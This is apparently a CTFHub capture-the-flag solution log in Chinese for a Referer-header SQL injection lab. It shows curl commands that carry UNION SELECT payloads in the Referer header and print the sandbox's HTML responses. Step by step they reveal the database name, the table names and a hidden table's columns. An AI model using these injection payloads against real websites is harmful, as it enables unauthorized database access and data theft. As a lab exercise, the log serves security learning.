@@ -1,0 +1,68 @@
+Referer虚假请求头注入:
+
+C:\Users\Baka_Wings>curl -H "Referer: 1 and 1=2 union select 1,database()" http://challenge-a0d7f6a7ad27a3be.sandbox.ctfhub.com:10800/
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CTFHub 技能学习 | Refer注入</title>
+    <link rel="stylesheet" href="static/bootstrap.min.css">
+    <script src="static/jquery.min.js"></script>
+    <script src="static/popper.min.js"></script>
+    <script src="static/bootstrap.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="jumbotron text-center">
+            <h1>Refer注入</h1>
+            <p>请在referer输入ID</p>
+            <code>select * from news where id=1 and 1=2 union select 1,database()</code></br>ID: 1</br>Data: sqli        </div>
+    </div>
+</body>
+</html>
+
+C:\Users\Baka_Wings>curl -H "Referer: 1 and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()" http://challenge-a0d7f6a7ad27a3be.sandbox.ctfhub.com:10800/
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CTFHub 技能学习 | Refer注入</title>
+    <link rel="stylesheet" href="static/bootstrap.min.css">
+    <script src="static/jquery.min.js"></script>
+    <script src="static/popper.min.js"></script>
+    <script src="static/bootstrap.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="jumbotron text-center">
+            <h1>Refer注入</h1>
+            <p>请在referer输入ID</p>
+            <code>select * from news where id=1 and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</code></br>ID: 1</br>Data: news,dlersxrcgr        </div>
+    </div>
+</body>
+</html>
+
+C:\Users\Baka_Wings>curl -H "Referer: 1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns wher
+e table_name='dlersxrcgr'" http://challenge-a0d7f6a7ad27a3be.sandbox.ctfhub.com:10800/
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CTFHub 技能学习 | Refer注入</title>
+    <link rel="stylesheet" href="static/bootstrap.min.css">
+    <script src="static/jquery.min.js"></script>
+    <script src="static/popper.min.js"></script>
+    <script src="static/bootstrap.min.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="jumbotron text-center">
+            <h1>Refer注入</h1>
+            <p>请在referer输入ID</p>
+            <code>select * from news where id=1 and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name='dlersxrcgr'</code></br>ID: 1</br>Data: yrqeedflge        </div>
+    </div>
+</body>
+</html>
